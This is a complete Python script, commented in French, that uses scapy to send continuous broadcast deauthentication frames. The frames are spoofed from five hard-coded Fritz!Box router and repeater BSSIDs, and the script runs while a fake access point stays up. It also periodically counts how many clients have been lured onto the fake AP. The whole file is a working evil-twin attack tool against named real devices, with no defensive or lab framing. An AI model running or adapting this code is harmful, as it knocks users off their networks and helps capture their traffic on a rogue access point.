#!/usr/bin/env python3
"""
Deauth continu via scapy sur wlan1mon (VIF monitor).
L'AP fake reste UP sur wlan1 en parallèle.

Usage: sudo python3 deauth_scapy.py [--count 5] [--pause 0.5]
"""
import sys, time, subprocess, signal, argparse
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, conf

# ── Cibles : tous les BSSID Fritz!Box (routeur + répéteur) ──
TARGETS = [
    "2c:3a:fd:80:e1:db",  # Routeur 7530 — 2.4 GHz
    "2c:3a:fd:80:e1:dc",  # Routeur 7530 — 5 GHz
    "04:b4:fe:59:15:42",  # Répéteur     — 2.4 GHz
    "04:b4:fe:59:15:43",  # Répéteur     — 5 GHz
    "48:22:54:b3:8b:14",  # Fritz 5490 EXT
]

MON = "wlan1mon"
AP  = "wlan1"
BROADCAST = "ff:ff:ff:ff:ff:ff"

def create_mon():
    """Créer wlan1mon si absent."""
    r = subprocess.run(f"iw dev {MON} info", shell=True, capture_output=True)
    if r.returncode != 0:
        print(f"[*] Création {MON}...")
        subprocess.run(f"iw dev {AP} interface add {MON} type monitor", shell=True, check=True)
    subprocess.run(f"ip link set {MON} up", shell=True, check=True)
    print(f"[+] {MON} UP (monitor) | {AP} UP (AP)")

def destroy_mon():
    """Supprimer wlan1mon proprement."""
    print(f"\n[*] Suppression {MON}...")
    subprocess.run(f"ip link set {MON} down", shell=True, capture_output=True)
    subprocess.run(f"iw dev {MON} del", shell=True, capture_output=True)
    print(f"[+] {MON} supprimé, AP intacte")

def build_deauth(bssid):
    """Construire un paquet deauth broadcast pour un BSSID donné."""
    dot11 = Dot11(
        type=0, subtype=12,       # Management frame, deauth
        addr1=BROADCAST,          # Destination: broadcast
        addr2=bssid,              # Source: le vrai AP
        addr3=bssid               # BSSID
    )
    return RadioTap() / dot11 / Dot11Deauth(reason=7)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--count", type=int, default=5, help="Deauths par cible par cycle")
    parser.add_argument("--pause", type=float, default=0.3, help="Pause entre cycles (sec)")
    args = parser.parse_args()

    create_mon()
    signal.signal(signal.SIGINT, lambda s, f: (destroy_mon(), sys.exit(0)))
    signal.signal(signal.SIGTERM, lambda s, f: (destroy_mon(), sys.exit(0)))

    # Pré-construire les paquets
    packets = {t: build_deauth(t) for t in TARGETS}

    conf.iface = MON
    cycle = 0

    print(f"\n[*] Deauth continu — {args.count}/cible, {len(TARGETS)} cibles, pause {args.pause}s")
    print("[*] Ctrl+C pour arrêter\n")

    try:
        while True:
            cycle += 1
            sent = 0
            for bssid, pkt in packets.items():
                sendp(pkt, iface=MON, count=args.count, inter=0.02, verbose=False)
                sent += args.count

            short_time = time.strftime("%H:%M:%S")
            print(f"[{short_time}] Cycle #{cycle} — {sent} deauths envoyés", end="")

            if cycle % 10 == 0:
                r = subprocess.run(
                    f"iw dev {AP} station dump | grep -c '^Station'",
                    shell=True, capture_output=True, text=True
                )
                stations = r.stdout.strip() or "0"
                print(f"  |  ★ {stations} clients sur fake AP", end="")

            print()
            time.sleep(args.pause)

    except KeyboardInterrupt:
        pass
    finally:
        destroy_mon()

if __name__ == "__main__":
    main()
